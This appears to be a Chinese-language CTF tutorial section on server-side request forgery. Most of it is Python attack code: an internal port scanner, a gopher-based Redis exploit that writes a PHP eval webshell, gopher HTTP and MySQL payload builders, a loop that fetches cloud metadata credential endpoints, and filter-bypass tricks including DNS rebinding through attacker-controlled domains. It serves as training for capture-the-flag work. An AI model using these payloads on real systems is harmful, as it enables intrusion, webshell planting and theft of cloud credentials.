# SSRF CTF题型

SSRF（Server-Side Request Forgery，服务端请求伪造）允许攻击者利用服务器发起内网请求。

### 3.1 内网探测

```python
import requests

def ssrf_scan(base_url):
    """利用SSRF进行内网端口扫描"""
    open_ports = []
    
    for port in range(1, 65536):
        # 构造SSRF Payload
        target = f"http://127.0.0.1:{port}"
        params = {"url": target}
        
        try:
            r = requests.get(base_url, params=params, timeout=3)
            # 根据响应差异判断端口是否开放
            if len(r.text) > 100 or "connection refused" not in r.text.lower():
                open_ports.append(port)
                print(f"[+] 端口 {port} 开放")
        except:
            pass
    
    return open_ports

# 常见内网服务端口
common_ports = {
    22: "SSH",
    80: "HTTP",
    443: "HTTPS",
    6379: "Redis",
    3306: "MySQL",
    27017: "MongoDB",
    9200: "Elasticsearch",
    8080: "HTTP-Alt",
}
```

### 3.2 Redis利用

```python
# SSRF + Redis未授权访问 → 写Webshell
import requests
import urllib.parse

def ssrf_redis_exploit(ssrf_url, redis_target, webshell_path):
    """通过SSRF攻击内网Redis"""
    
    # 构造Redis命令
    redis_commands = f"""
    config set dir {webshell_path}
    config set dbfilename shell.php
    set test "<?php @eval($_POST[cmd]);?>"
    save
    """
    
    # 使用gopher协议发送Redis命令
    # 将Redis命令转换为RESP协议格式
    resp = ""
    for cmd in redis_commands.strip().split('\n'):
        cmd = cmd.strip()
        if cmd:
            resp += f"*{len(cmd.split())}\r\n"
            for arg in cmd.split():
                resp += f"${len(arg)}\r\n{arg}\r\n"
    
    # URL编码
    gopher_payload = f"gopher://{redis_target}:6379/_" + urllib.parse.quote(resp)
    
    # 通过SSRF发送
    r = requests.get(ssrf_url, params={"url": gopher_payload})
    print(r.text)
```

### 3.3 Gopher协议利用

```python
# Gopher协议发送HTTP请求
import urllib.parse

def gopher_http_request(target_host, target_port, path):
    """构造gopher协议的HTTP请求"""
    
    http_request = f"GET {path} HTTP/1.1\r\n"
    http_request += f"Host: {target_host}:{target_port}\r\n"
    http_request += "Connection: close\r\n"
    http_request += "\r\n"
    
    # URL编码（gopher协议需要对整个请求进行URL编码）
    encoded = urllib.parse.quote(http_request)
    
    gopher_url = f"gopher://{target_host}:{target_port}/_{encoded}"
    return gopher_url

# 示例：通过SSRF + gopher访问内网服务
# gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

### 3.4 MySQL利用

```python
# SSRF + MySQL未授权 → 读取数据
# 使用gopher协议构造MySQL协议数据包

def ssrf_mysql_query(ssrf_url, mysql_host, query):
    """通过SSRF执行MySQL查询"""
    
    # MySQL协议较为复杂，通常使用工具生成
    # 工具: Gopherus (https://github.com/tarunkant/Gopherus)
    
    # 示例payload（简化）
    # 实际需要完整构造MySQL认证和查询包
    gopher_payload = "gopher://mysql_host:3306/_" + "编码后的MySQL协议数据"
    
    r = requests.get(ssrf_url, params={"url": gopher_payload})
    return r.text
```

### 3.5 云服务元数据

```python
# 云服务SSRF利用 - 读取实例元数据
cloud_metadata = {
    # AWS
    "aws_iam_role": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_user_data": "http://169.254.169.254/latest/user-data",
    
    # GCP
    "gcp_token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    
    # Azure
    "azure_token": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Alibaba Cloud
    "aliyun_metadata": "http://100.100.100.200/latest/meta-data/",
}

# 通过SSRF读取
for name, url in cloud_metadata.items():
    r = requests.get(ssrf_url, params={"url": url})
    print(f"[{name}] {r.text}")
```

### 3.6 SSRF绕过技巧

```python
# 常见SSRF过滤绕过方法
ssrf_bypass = {
    # IP地址绕过
    "进制转换": "127.0.0.1 → 0x7f000001 / 2130706433 / 017700000001",
    "DNS解析": "本地DNS指向127.0.0.1的域名如 localtest.me",
    "IPv6": "127.0.0.1 → [::1] / [0:0:0:0:0:0:0:1]",
    "短链接": "使用短链接服务跳转到内网地址",
    "URL解析差异": "http://127.0.0.1@evil.com → 解析到evil.com",
    "DNS Rebinding": "第一次解析公网IP，第二次解析内网IP",
    
    # 协议绕过
    "其他协议": "file:// / dict:// / gopher:// / ldap://",
    
    # 重定向绕过
    "302跳转": "在自己服务器上设置302跳转到内网地址",
}

# DNS Rebinding实现
"""
1. 在DNS服务商设置两条A记录：
   - rebind.attacker.com → 攻击者IP（TTL=0）
   - rebind.attacker.com → 127.0.0.1（TTL=0）
2. 服务端第一次验证DNS时解析到攻击者IP（通过验证）
3. 服务端实际请求时DNS解析到127.0.0.1（访问内网）
"""
```

---

---

